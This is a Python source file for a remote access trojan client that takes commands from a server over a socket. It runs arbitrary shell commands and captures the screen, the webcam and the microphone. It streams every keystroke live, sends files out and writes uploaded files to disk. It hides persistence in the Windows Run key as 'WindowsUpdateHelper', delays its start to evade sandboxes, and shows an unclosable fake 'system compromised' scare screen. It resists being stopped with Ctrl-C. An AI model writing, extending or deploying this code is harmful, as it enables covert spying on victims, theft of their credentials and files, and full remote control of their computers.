import socket
import subprocess
import time
import os
import json
import base64
import platform
import sys
import threading

# Auto-install required libraries
def install_package(package, import_name=None):
    import_name = import_name or package
    try:
        __import__(import_name)
    except ImportError:
        print(f"📦 Installing {package}...")
        # Check if Kali/Debian with restricted environment
        if platform.system() == "Linux" and os.path.exists("/usr/bin/apt"):
            try:
                # Try with --break-system-packages for Kali/Debian
                subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package, "--break-system-packages"])
            except:
                print(f"⚠️ Try manually: sudo apt install python3-{package.lower()}")
        else:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
        print(f"✅ {package} installed")

install_package("Pillow", "PIL")
install_package("mss")
install_package("sounddevice")
install_package("numpy")
install_package("pynput")

SERVER_IP = "127.0.0.1"
PORT = 5000

current_dir = os.getcwd()
os_name = platform.system()

# OS-specific command mappings
COMMANDS = {
    "Windows": {
        "list_files": "dir",
        "list_processes": "tasklist",
        "network_info": "ipconfig",
        "system_info": "systeminfo",
        "find_process": "tasklist | findstr",
        "kill_process": "taskkill /F /IM",
        "restart": "shutdown /r /t 0",
        "shutdown": "shutdown /s /t 0",
        "lock": "rundll32.exe user32.dll,LockWorkStation",
        "clear": "cls"
    },
    "Linux": {
        "list_files": "ls -la",
        "list_processes": "ps aux",
        "network_info": "ip addr",
        "system_info": "uname -a && lsb_release -a 2>/dev/null || cat /etc/os-release",
        "find_process": "ps aux | grep",
        "kill_process": "killall",
        "restart": "reboot",
        "shutdown": "shutdown -h now",
        "lock": "gnome-screensaver-command -l 2>/dev/null || loginctl lock-session 2>/dev/null || echo 'Lock not supported'",
        "clear": "clear"
    }
}

def get_command(cmd_type):
    """Get OS-specific command"""
    return COMMANDS.get(os_name, COMMANDS["Linux"]).get(cmd_type, cmd_type)

def connect_server():
    """Connect to server with retry"""
    while True:
        try:
            client = socket.socket()
            client.connect((SERVER_IP, PORT))
            print("✓ Connected to server")
            
            # Send client info on connect
            info = {
                "type": "CLIENT_INFO",
                "hostname": platform.node(),
                "os": platform.system(),
                "os_version": platform.version(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "user": os.getlogin()
            }
            client.send(json.dumps(info).encode())
            
            return client
        except:
            print("Connection failed. Retrying in 5 seconds...")
            time.sleep(5)

def take_screenshot():
    """Capture screenshot - high quality with memory management"""
    try:
        from PIL import Image, ImageGrab
        import io
        
        if os_name == "Windows":
            screenshot = ImageGrab.grab()
        else:
            # Linux/Mac using mss or PIL
            try:
                screenshot = ImageGrab.grab()
            except:
                import mss
                import mss.tools
                with mss.mss() as sct:
                    screenshot = sct.grab(sct.monitors[1])
                    screenshot = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
        
        # Get original resolution
        orig_width, orig_height = screenshot.size
        total_pixels = orig_width * orig_height
        
        # Adaptive quality and size based on resolution to prevent crash
        if total_pixels > 8294400:  # > 4K (3840x2160)
            # Very large - resize to 4K max
            max_size = (3840, 2160)
            screenshot.thumbnail(max_size, Image.Resampling.LANCZOS)
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=90, optimize=True, subsampling=0)
            img_data = base64.b64encode(buffer.getvalue()).decode()
            img_format = "JPEG"
            
        elif total_pixels > 3686400:  # > 2K (2560x1440)
            # 4K - high quality JPEG
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=92, optimize=True, subsampling=0)
            img_data = base64.b64encode(buffer.getvalue()).decode()
            img_format = "JPEG"
            
        elif total_pixels > 2073600:  # > Full HD (1920x1080)
            # 2K - very high quality
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=93, optimize=True, subsampling=0)
            img_data = base64.b64encode(buffer.getvalue()).decode()
            img_format = "JPEG"
            
        else:
            # Full HD or lower - maximum quality
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=95, optimize=True, subsampling=0)
            img_data = base64.b64encode(buffer.getvalue()).decode()
            img_format = "JPEG"
        
        # Safety check - if still too large (>15MB), compress more
        max_size_bytes = 15 * 1024 * 1024  # 15MB limit
        if len(img_data) > max_size_bytes:
            # Progressively reduce quality until size is acceptable
            for quality in [85, 80, 75, 70]:
                buffer = io.BytesIO()
                screenshot.save(buffer, format='JPEG', quality=quality, optimize=True)
                img_data = base64.b64encode(buffer.getvalue()).decode()
                if len(img_data) <= max_size_bytes:
                    break
            img_format = "JPEG"
        
        # Clear memory
        del screenshot
        del buffer
        
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "success",
            "data": img_data,
            "size": len(img_data),
            "format": img_format,
            "resolution": f"{orig_width}x{orig_height}"
        })
        
    except MemoryError:
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "error",
            "message": "Screenshot too large - insufficient memory"
        })
    except ImportError as e:
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "error",
            "message": f"Screenshot library not installed: {str(e)}. Run: pip install pillow mss"
        })
    except Exception as e:
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "error",
            "message": f"Screenshot failed: {str(e)}"
        })

def capture_webcam():
    """Capture webcam photo — tries OpenCV first, then fallback."""
    try:
        import io
        frame_captured = False
        img_data = None

        # ── Method 1: OpenCV (best quality) ───────────────────────────────────
        try:
            import cv2
            cap = cv2.VideoCapture(0)   # 0 = default camera
            if not cap.isOpened():
                # Try camera index 1 (external webcam)
                cap = cv2.VideoCapture(1)
            if cap.isOpened():
                cap.set(cv2.CAP_PROP_FRAME_WIDTH,  1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                cap.set(cv2.CAP_PROP_AUTOFOCUS, 1)
                # Warm-up frames (camera needs a moment to adjust exposure)
                for _ in range(5):
                    cap.read()
                ret, frame = cap.read()
                cap.release()
                if ret and frame is not None:
                    from PIL import Image
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    pil_img   = Image.fromarray(frame_rgb)
                    buf = io.BytesIO()
                    pil_img.save(buf, format='JPEG', quality=90, optimize=True)
                    img_data = base64.b64encode(buf.getvalue()).decode()
                    w, h = pil_img.size
                    frame_captured = True
        except ImportError:
            pass  # cv2 not installed, try fallback

        # ── Method 2: Windows DirectShow via PIL (fallback) ───────────────────
        if not frame_captured and os_name == "Windows":
            try:
                import subprocess, tempfile, os as _os
                tmp = tempfile.mktemp(suffix=".jpg")
                # Use PowerShell + Windows Camera API
                ps_cmd = (
                    f"Add-Type -AssemblyName System.Windows.Forms; "
                    f"$cam = [Windows.Media.Capture.MediaCapture]::new(); "
                    f"Start-Sleep -m 500"
                )
                # Simpler: use ffmpeg if available
                result = subprocess.run(
                    ["ffmpeg", "-y", "-f", "dshow", "-i", "video=0",
                     "-frames:v", "1", "-q:v", "2", tmp],
                    capture_output=True, timeout=10
                )
                if result.returncode == 0 and _os.path.exists(tmp):
                    with open(tmp, "rb") as f:
                        img_data = base64.b64encode(f.read()).decode()
                    _os.remove(tmp)
                    w, h = 1280, 720
                    frame_captured = True
            except Exception:
                pass

        if not frame_captured or not img_data:
            return json.dumps({
                "type": "WEBCAM",
                "status": "error",
                "message": "No camera found or camera access denied. Install opencv-python: pip install opencv-python"
            })

        return json.dumps({
            "type": "WEBCAM",
            "status": "success",
            "data": img_data,
            "resolution": f"{w}x{h}"
        })

    except Exception as e:
        return json.dumps({"type": "WEBCAM", "status": "error", "message": str(e)})

def capture_audio(duration=10):
    """Capture microphone audio and return as base64 WAV"""
    try:
        import sounddevice as sd
        import numpy as np
        import wave
        import io

        sample_rate = 44100
        channels = 2

        import threading as _t
        import time as _time

        print(f"🎤 Recording audio for {duration} seconds...")

        result = [None]
        rec_err = [None]

        def _record():
            try:
                result[0] = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=channels, dtype='int16')
                sd.wait()
            except Exception as e:
                rec_err[0] = e

        rec_thread = _t.Thread(target=_record, daemon=True)
        rec_thread.start()
        rec_thread.join(timeout=duration + 20)

        if rec_thread.is_alive():
            sd.stop()
            raise Exception("Recording timed out - no microphone response")
        if rec_err[0]:
            raise rec_err[0]
        if result[0] is None:
            raise Exception("No audio data received from microphone")

        recording = result[0]
        print("✓ Recording complete")

        buffer = io.BytesIO()
        with wave.open(buffer, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(sample_rate)
            wf.writeframes(recording.tobytes())

        audio_data = base64.b64encode(buffer.getvalue()).decode()

        del recording
        del buffer

        return json.dumps({
            "type": "MICROPHONE",
            "status": "success",
            "data": audio_data,
            "size": len(audio_data),
            "duration": duration,
            "sample_rate": sample_rate,
            "channels": channels,
            "format": "WAV"
        })

    except ImportError as e:
        return json.dumps({
            "type": "MICROPHONE",
            "status": "error",
            "message": f"Audio library not installed: {str(e)}. Run: pip install sounddevice numpy"
        })
    except Exception as e:
        return json.dumps({
            "type": "MICROPHONE",
            "status": "error",
            "message": f"Audio capture failed: {str(e)}"
        })

# ── Keylog Live-Stream State ────────────────────────────────────────────────────
_keylog_listener = None
_keylog_active = False


def start_keylog_stream():
    """Start background listener that streams [KEYSTROKE] lines live to server."""
    global _keylog_listener, _keylog_active
    _keylog_active = True
    from pynput import keyboard
    from datetime import datetime

    def on_press(key):
        if not _keylog_active:
            return False
        try:
            ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            try:
                k = key.char
            except AttributeError:
                k = None
            if k is not None:
                line = f"[KEYSTROKE] {ts} {k}"
            else:
                s = str(key)
                if s.startswith("Key."):
                    line = f"[KEYSTROKE] {ts} <{s.replace('Key.', '').upper()}>"
                elif s.startswith("<") and s.endswith(">"):
                    line = f"[KEYSTROKE] {ts} {s}"
                else:
                    line = f"[KEYSTROKE] {ts} <{s.upper()}>"
            global client
            client.send(line.encode())
            client.send(b"\n")
        except Exception:
            pass

    _keylog_listener = keyboard.Listener(on_press=on_press)
    _keylog_listener.start()


def stop_keylog_stream():
    """Stop the keylog listener and signal end-of-stream."""
    global _keylog_listener, _keylog_active
    _keylog_active = False
    if _keylog_listener is not None:
        try:
            _keylog_listener.stop()
        except Exception:
            pass
        _keylog_listener = None
    global client
    try:
        client.send(b"[KEYLOG_END]\n")
    except Exception:
        pass

def download_file(filepath):
    """Send file to server"""
    try:
        if not os.path.exists(filepath):
            return json.dumps({"type": "DOWNLOAD", "status": "error", "message": "File not found"})
        
        # Check file size limit
        file_size = os.path.getsize(filepath)
        if file_size > 50 * 1024 * 1024:  # 50MB limit
            return json.dumps({
                "type": "DOWNLOAD",
                "status": "error",
                "message": f"File too large: {file_size / (1024*1024):.2f}MB (max 50MB)"
            })
        
        with open(filepath, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode()
        
        return json.dumps({
            "type": "DOWNLOAD",
            "status": "success",
            "filename": os.path.basename(filepath),
            "data": file_data,
            "size": file_size
        })
    except Exception as e:
        return json.dumps({"type": "DOWNLOAD", "status": "error", "message": str(e)})

def upload_file(filename, data_b64):
    """Receive file from server"""
    try:
        # Limit file size to prevent memory issues
        if len(data_b64) > 70000000:  # ~50MB after base64 encoding
            return json.dumps({
                "type": "UPLOAD",
                "status": "error",
                "message": "File too large (max 50MB)"
            })
        
        file_data = base64.b64decode(data_b64)
        
        filepath = os.path.join(current_dir, filename)
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        return json.dumps({
            "type": "UPLOAD",
            "status": "success",
            "message": f"File saved: {filepath}",
            "size": len(file_data)
        })
    except Exception as e:
        return json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)})

def _add_persistence():
    """Add to Windows startup registry (HKCU Run) for persistence."""
    if platform.system() == "Windows":
        try:
            import winreg as _wr
            exe = sys.executable if sys.executable.lower().endswith(".exe") else sys.argv[0]
            if not exe.lower().endswith(".exe"):
                return
            key = _wr.OpenKey(_wr.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, _wr.KEY_SET_VALUE)
            _wr.SetValueEx(key, "WindowsUpdateHelper", 0, _wr.REG_SZ, f'"{exe}"')
            _wr.CloseKey(key)
        except Exception:
            pass


def main_loop():
    """Main client loop with auto-reconnect - disabled for screenshot failures"""
    global client, current_dir
    time.sleep(18)  # Sandbox evasion: delay before connecting
    _add_persistence()
    screenshot_in_progress = False
    
    while True:
        try:
            client = connect_server()
            current_dir = os.getcwd()
            screenshot_in_progress = False
            
            while True:
                try:
                    data = client.recv(65536)
                    
                    if not data:
                        print("⚠️ Server closed connection")
                        # If screenshot was in progress, don't auto-reconnect
                        if screenshot_in_progress:
                            print("❌ Screenshot failed - connection lost. Exiting...")
                            return
                        break
                    
                    cmd = data.decode(errors='ignore').strip()

                    if cmd.lower() == "exit":
                        print("✓ Exit command received")
                        client.close()
                        return
                    
                    elif cmd.lower() == "shutdown_client":
                        print("✓ Server requested client shutdown")
                        client.close()
                        print("🔴 Client terminated by server")
                        threading.Timer(3.0, os._exit, [0]).start()
                        sys.exit(0)

                    # Special commands
                    if cmd.startswith("POPUP:"):
                        # Show popup message on client screen
                        try:
                            parts = cmd.split(":", 2)
                            title = parts[1] if len(parts) > 1 else "Message"
                            message = parts[2] if len(parts) > 2 else ""
                            
                            def show_big_popup():
                                try:
                                    import tkinter as tk
                                    root = tk.Tk()
                                    root.title(title)

                                    # Borderless + fullscreen + always on top
                                    root.overrideredirect(True)
                                    root.attributes('-fullscreen', True)
                                    root.attributes('-topmost', True)
                                    root.attributes('-alpha', 0.0)

                                    # Block all close attempts
                                    root.protocol("WM_DELETE_WINDOW", lambda: None)
                                    root.bind("<Alt-F4>", lambda e: "break")
                                    root.bind("<Escape>", lambda e: "break")
                                    root.bind("<Control>", lambda e: "break")
                                    root.bind("<Alt>", lambda e: "break")

                                    screen_width = root.winfo_screenwidth()
                                    screen_height = root.winfo_screenheight()

                                    root.configure(bg="#FF003C")

                                    # Outer glow frame
                                    outer_glow = tk.Frame(root, bg="#FF003C")
                                    outer_glow.pack(fill="both", expand=True, padx=6, pady=6)

                                    # Inner container
                                    inner = tk.Frame(outer_glow, bg="#0A0A0A")
                                    inner.pack(fill="both", expand=True, padx=2, pady=2)

                                    # Top warning bar
                                    warn_bar = tk.Frame(inner, bg="#FF003C", height=8)
                                    warn_bar.pack(fill="x")
                                    warn_bar.pack_propagate(False)

                                    # Blinking Warning Header
                                    alert_label = tk.Label(inner, text="⚠️ SYSTEM OVERRIDE ⚠️",
                                                           font=("Consolas", 36, "bold"), bg="#0A0A0A", fg="#FF003C")
                                    alert_label.pack(pady=(50, 10))

                                    def blink_alert():
                                        try:
                                            current_fg = alert_label.cget("fg")
                                            next_fg = "#0A0A0A" if current_fg == "#FF003C" else "#FF003C"
                                            alert_label.config(fg=next_fg)
                                            root.after(300, blink_alert)
                                        except: pass
                                    blink_alert()

                                    # Title
                                    tk.Label(inner, text=title, font=("Consolas", 42, "bold"),
                                             bg="#0A0A0A", fg="white", wraplength=screen_width-100).pack(pady=(20, 15))

                                    # Message with typewriter-style green text
                                    msg_label = tk.Label(inner, text=message, font=("Consolas", 24),
                                                         bg="#0A0A0A", fg="#00FF41", wraplength=screen_width-100,
                                                         justify="center")
                                    msg_label.pack(pady=15, expand=True)

                                    # Red warning bottom text
                                    tk.Label(inner, text="DO NOT IGNORE — CRITICAL SYSTEM ALERT",
                                             font=("Consolas", 14, "bold"), bg="#0A0A0A", fg="#FF003C").pack(pady=(10, 5))

                                    is_open = [True]
                                    click_count = [0]

                                    def ambulance_siren_loop():
                                        if platform.system() != "Windows": return
                                        try:
                                            import winsound
                                            while is_open[0]:
                                                if not is_open[0]: break
                                                winsound.Beep(700, 400)
                                                if not is_open[0]: break
                                                winsound.Beep(900, 400)
                                        except: pass

                                    def scary_voice_loop():
                                        if platform.system() != "Windows": return
                                        try:
                                            import subprocess
                                            msg_text = "Warning. System compromised. Unauthorized access detected. All data will be encrypted."
                                            ps_cmd = (
                                                'powershell -Command "Add-Type -AssemblyName System.Speech; '
                                                '$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
                                                '$synth.Rate = -3; '
                                                f'$synth.Speak(\'{msg_text}\')"'
                                            )
                                            while is_open[0]:
                                                subprocess.run(ps_cmd, shell=True, creationflags=0x08000000)
                                        except: pass

                                    threading.Thread(target=ambulance_siren_loop, daemon=True).start()
                                    threading.Thread(target=scary_voice_loop, daemon=True).start()

                                    def on_enter(e): btn.config(bg="#FF003C", fg="white")
                                    def on_leave(e): btn.config(bg="#1A1A1A", fg="#FF003C")

                                    def close_popup():
                                        click_count[0] += 1
                                        if click_count[0] >= 3:
                                            is_open[0] = False
                                            root.destroy()
                                        else:
                                            btn.config(text=f"[ ACKNOWLEDGE ({3-click_count[0]}) ]")

                                    btn = tk.Button(inner, text="[ ACKNOWLEDGE (3) ]", command=close_popup,
                                                    font=("Consolas", 18, "bold"), bg="#1A1A1A", fg="#FF003C",
                                                    relief="flat", activebackground="#FF003C", activeforeground="white",
                                                    padx=40, pady=15)
                                    btn.pack(pady=40)
                                    btn.bind("<Enter>", on_enter)
                                    btn.bind("<Leave>", on_leave)

                                    # Fade-in
                                    def fade_in(alpha=0.0):
                                        try:
                                            alpha += 0.04
                                            if alpha <= 1.0:
                                                root.attributes('-alpha', alpha)
                                                root.after(25, fade_in)
                                        except: pass

                                    def force_focus():
                                        try:
                                            root.lift()
                                            root.attributes('-topmost', True)
                                            root.focus_force()
                                            root.after(400, force_focus)
                                        except: pass

                                    root.after(100, fade_in)
                                    force_focus()

                                    root.mainloop()
                                except Exception as e:
                                    # Fallback if tkinter fails
                                    if platform.system() == "Windows":
                                        import ctypes
                                        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x40000 | 0x10000)
                            
                            threading.Thread(target=show_big_popup, daemon=True).start()
                            
                            output = json.dumps({"type": "POPUP", "status": "success", "message": "Popup shown"}).encode()
                        except Exception as e:
                            output = json.dumps({"type": "POPUP", "status": "error", "message": str(e)}).encode()
                    
                    elif cmd == "SCREENSHOT":
                        screenshot_in_progress = True
                        output = take_screenshot().encode()
                        screenshot_in_progress = False
                    
                    elif cmd == "WEBCAM":
                        output = capture_webcam().encode()
                    
                    elif cmd == "MICROPHONE" or cmd.startswith("MICROPHONE:"):
                        try:
                            duration = 10
                            if cmd.startswith("MICROPHONE:"):
                                duration = int(cmd.split(":", 1)[1].strip())
                            output = capture_audio(duration).encode()
                        except Exception as e:
                            output = json.dumps({"type": "MICROPHONE", "status": "error", "message": str(e)}).encode()
                    
                    elif cmd == "KEYLOG_START":
                        start_keylog_stream()
                        continue

                    elif cmd == "KEYLOG_STOP":
                        stop_keylog_stream()
                        continue
                    
                    elif cmd.startswith("DOWNLOAD:"):
                        filepath = cmd.split(":", 1)[1].strip()
                        output = download_file(filepath).encode()
                    
                    elif cmd.startswith("UPLOAD:"):
                        try:
                            parts = cmd.split(":", 2)
                            filename = parts[1].strip()
                            data_b64 = parts[2]
                            output = upload_file(filename, data_b64).encode()
                        except Exception as e:
                            output = json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)}).encode()
                    
                    elif cmd == "SYSINFO":
                        info = {
                            "type": "SYSINFO",
                            "hostname": platform.node(),
                            "os": f"{platform.system()} {platform.release()}",
                            "architecture": platform.machine(),
                            "processor": platform.processor(),
                            "user": os.getlogin(),
                            "current_dir": os.getcwd()
                        }
                        output = json.dumps(info, indent=2).encode()
                    
                    elif cmd.strip().startswith("cd"):
                        path = cmd.strip()[2:].strip()
                        try:
                            if path == "":
                                output = f"Directory: {current_dir}".encode()
                            elif path == "..":
                                os.chdir("..")
                                current_dir = os.getcwd()
                                output = f"Directory: {current_dir}".encode()
                            else:
                                os.chdir(path)
                                current_dir = os.getcwd()
                                output = f"Directory: {current_dir}".encode()
                        except Exception as e:
                            output = f"Error: {str(e)}".encode()
                    
                    elif cmd == "NETWORK_INFO":
                        cmd = get_command("network_info")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "LIST_FILES":
                        cmd = get_command("list_files")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "PROCESSES":
                        cmd = get_command("list_processes")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "SYSTEM_INFO":
                        cmd = get_command("system_info")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "RESTART":
                        cmd = get_command("restart")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = b"Restart command sent"
                    
                    elif cmd == "SHUTDOWN":
                        cmd = get_command("shutdown")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = b"Shutdown command sent"
                    
                    elif cmd == "LOCK":
                        cmd = get_command("lock")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = b"Lock command sent"
                    
                    elif cmd.startswith("FIND_PROCESS:"):
                        name = cmd.split(":", 1)[1].strip()
                        cmd_str = get_command("find_process") + " " + name
                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd.startswith("KILL_PROCESS:"):
                        name = cmd.split(":", 1)[1].strip()
                        cmd_str = get_command("kill_process") + " " + name
                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    else:
                        # Command aliases for cross-platform compatibility
                        cmd_stripped = cmd.strip()
                        cmd_lower = cmd_stripped.lower()
                        
                        # Handle common Linux commands that might be typed
                        if cmd_lower == "ls- la" or cmd_lower == "ls-la":
                            cmd = "ls -la"
                        elif cmd_lower == "ls-la":
                            cmd = "ls -la"
                        elif cmd_lower == "ll":
                            cmd = "ls -la"
                        elif cmd_lower == "la":
                            cmd = "ls -la"
                        elif cmd_lower == "l":
                            cmd = "ls -la"
                        elif cmd_lower == "tree":
                            cmd = "tree"  # Keep tree as is
                        elif cmd_lower == "df":
                            cmd = "df -h"  # Disk free with human readable
                        elif cmd_lower == "du":
                            cmd = "du -sh"  # Disk usage summary
                        elif cmd_lower == "free":
                            cmd = "free -h"  # Memory with human readable
                        elif cmd_lower == "top":
                            cmd = "top"  # Process monitor
                        elif cmd_lower == "htop":
                            cmd = "htop"  # Better process monitor
                        elif cmd_lower == "nano":
                            cmd = "nano"  # Text editor
                        elif cmd_lower == "vi":
                            cmd = "vi"  # Text editor
                        elif cmd_lower == "vim":
                            cmd = "vim"  # Text editor
                        elif cmd_lower == "grep":
                            cmd = "grep"  # Keep grep as is
                        elif cmd_lower == "find":
                            cmd = "find"  # Keep find as is
                        elif cmd_lower == "chmod":
                            cmd = "chmod"  # Keep chmod as is
                        elif cmd_lower == "chown":
                            cmd = "chown"  # Keep chown as is
                        
                        # Handle sudo commands on Linux
                        if os_name == "Linux" and cmd_lower.startswith("sudo "):
                            # Remove sudo prefix and run command directly with shell=True
                            cmd = cmd[5:]  # Remove 'sudo ' prefix
                        
                        # Linux/Windows command mapping
                        if os_name == "Windows":
                            if cmd_lower == "ls":
                                cmd = "dir"
                            elif cmd_lower.startswith("ls "):
                                cmd = "dir" + cmd[2:]
                            elif cmd_lower == "pwd":
                                cmd = "cd"
                            elif cmd_lower == "clear":
                                cmd = "cls"
                            elif cmd_lower.startswith("cat "):
                                cmd = "type" + cmd[3:]
                            elif cmd_lower.startswith("rm "):
                                cmd = "del" + cmd[2:]
                            elif cmd_lower.startswith("mv "):
                                cmd = "move" + cmd[2:]
                            elif cmd_lower.startswith("cp "):
                                cmd = "copy" + cmd[2:]
                            elif cmd_lower.startswith("rmdir "):
                                cmd = "rmdir " + cmd[5:]
                            elif cmd_lower.startswith("mkdir "):
                                cmd = "md " + cmd[5:]  # Linux mkdir to Windows md
                            elif cmd_lower == "tree":
                                cmd = "tree"  # Windows tree command
                            elif cmd_lower == "grep":
                                cmd = "findstr"  # Linux grep to Windows findstr
                            elif cmd_lower.startswith("grep "):
                                cmd = "findstr " + cmd[4:]  # Linux grep to Windows findstr
                            elif cmd_lower == "ps":
                                cmd = "tasklist"  # Linux ps to Windows tasklist
                            elif cmd_lower == "kill":
                                cmd = "taskkill"  # Linux kill to Windows taskkill
                            elif cmd_lower.startswith("kill "):
                                cmd = "taskkill /F /IM " + cmd[4:]  # Linux kill to Windows taskkill
                            elif cmd_lower == "df":
                                cmd = "wmic logicaldisk get size,freespace,caption"  # Disk info
                            elif cmd_lower == "du":
                                cmd = "dir /s"  # Directory size
                            elif cmd_lower == "free":
                                cmd = "wmic OS get TotalVisibleMemorySize,FreePhysicalMemory"  # Memory info
                            elif cmd_lower == "top":
                                cmd = "tasklist"  # Process list
                            elif cmd_lower == "nano" or cmd_lower == "vi" or cmd_lower == "vim":
                                cmd = "notepad"  # Text editors to notepad
                            elif cmd_lower.startswith("chmod "):
                                cmd = "icacls " + cmd[5:]  # Linux chmod to Windows icacls
                            elif cmd_lower == "ifconfig":
                                cmd = "ipconfig"  # Keep ifconfig as ipconfig on Windows
                        else:
                            if cmd_lower == "cls":
                                cmd = "clear"
                            elif cmd_lower == "dir":
                                cmd = "ls"
                            elif cmd_lower == "ipconfig":
                                cmd = "ip addr"
                            elif cmd_lower == "ifconfig":
                                cmd = "ip addr"
                            elif cmd_lower == "tasklist":
                                cmd = "ps aux"
                            elif cmd_lower == "tasklist /svc":  # Windows style
                                cmd = "ps aux"
                            elif cmd_lower == "systeminfo":
                                cmd = "uname -a"
                            elif cmd_lower == "ver":
                                cmd = "uname -a"
                            elif cmd_lower == "chdir":
                                cmd = "cd"
                            elif cmd_lower.startswith("del "):
                                cmd = "rm " + cmd[3:]  # Windows del to Linux rm
                            elif cmd_lower.startswith("rmdir "):
                                cmd = "rmdir " + cmd[5:]
                            elif cmd_lower.startswith("md "):  # Windows md
                                cmd = "mkdir " + cmd[2:]
                            elif cmd_lower.startswith("move "):
                                cmd = "mv " + cmd[4:]
                            elif cmd_lower.startswith("copy "):
                                cmd = "cp " + cmd[4:]
                            elif cmd_lower.startswith("type "):
                                cmd = "cat " + cmd[4:]
                            elif cmd_lower == "tree":
                                cmd = "tree"  # Keep tree as is
                            elif cmd_lower == "findstr":
                                cmd = "grep"  # Windows findstr to Linux grep
                            elif cmd_lower.startswith("findstr "):
                                cmd = "grep " + cmd[7:]  # Windows findstr to Linux grep
                            elif cmd_lower == "notepad":
                                cmd = "nano"  # Windows notepad to Linux nano
                            elif cmd_lower.startswith("notepad "):
                                cmd = "nano " + cmd[7:]  # Windows notepad to Linux nano
                            elif cmd_lower == "taskkill":
                                cmd = "kill"  # Windows taskkill to Linux kill
                            elif cmd_lower.startswith("taskkill "):
                                cmd = "kill " + cmd[8:]  # Windows taskkill to Linux kill
                            elif cmd_lower == "wmic":
                                cmd = "dmidecode"  # Windows wmic to Linux dmidecode
                            elif cmd_lower.startswith("wmic "):
                                cmd = "dmidecode " + cmd[4:]  # Windows wmic to Linux dmidecode
                        
                        # Regular command
                        try:
                            result = subprocess.run(
                                cmd,
                                shell=True,
                                capture_output=True,
                                text=False,
                                cwd=current_dir,
                                timeout=5
                            )
                            
                            if result.returncode == 0:
                                if result.stdout and len(result.stdout.strip()) > 0:
                                    output = result.stdout
                                else:
                                    output = f"✓ Command executed successfully".encode()
                            else:
                                if result.stderr and len(result.stderr.strip()) > 0:
                                    # Check for permission denied and provide helpful message
                                    stderr_text = result.stderr.decode(errors='ignore')
                                    if "Permission denied" in stderr_text:
                                        if os_name == "Linux":
                                            output = f"❌ Permission denied. Try 'sudo {cmd}' or check directory permissions".encode()
                                        else:
                                            output = f"❌ Permission denied. Run as Administrator or check directory permissions".encode()
                                    else:
                                        output = result.stderr
                                else:
                                    output = f"Command failed with code {result.returncode}".encode()
                                
                        except subprocess.TimeoutExpired:
                            output = "⚠️ Command timeout (5 seconds)".encode()
                        except Exception as e:
                            error_msg = str(e)
                            # Handle common shell errors
                            if "not found" in error_msg.lower():
                                output = f"❌ Command not found: {cmd}".encode()
                            elif "permission denied" in error_msg.lower():
                                output = f"❌ Permission denied: {cmd}".encode()
                            else:
                                output = error_msg.encode()

                    client.send(output)
                    
                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE", "KEYLOG_START", "KEYLOG_STOP")):
                        try:
                            time.sleep(0.1)
                            client.send(b"\n}")
                        except:
                            pass

                except ConnectionResetError:
                    print("⚠️ Server disconnected")
                    break  # Exit inner loop, will reconnect
                except ConnectionAbortedError:
                    print("⚠️ Server closed connection")
                    break  # Exit inner loop, will reconnect
                except Exception as e:
                    print(f"⚠️ Connection error: {e}")
                    break  # Exit inner loop, will reconnect
            
            # Connection lost, close and retry
            try:
                client.close()
            except:
                pass
            print("🔄 Reconnecting in 5 seconds...")
            time.sleep(5)
            
        except KeyboardInterrupt:
            print("\n⚠️ Client cannot be stopped manually. Waiting for server to disconnect...")
            continue  # Keep running, don't exit
        except Exception as e:
            print(f"⚠️ Error: {e}")
            print("🔄 Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    main_loop()
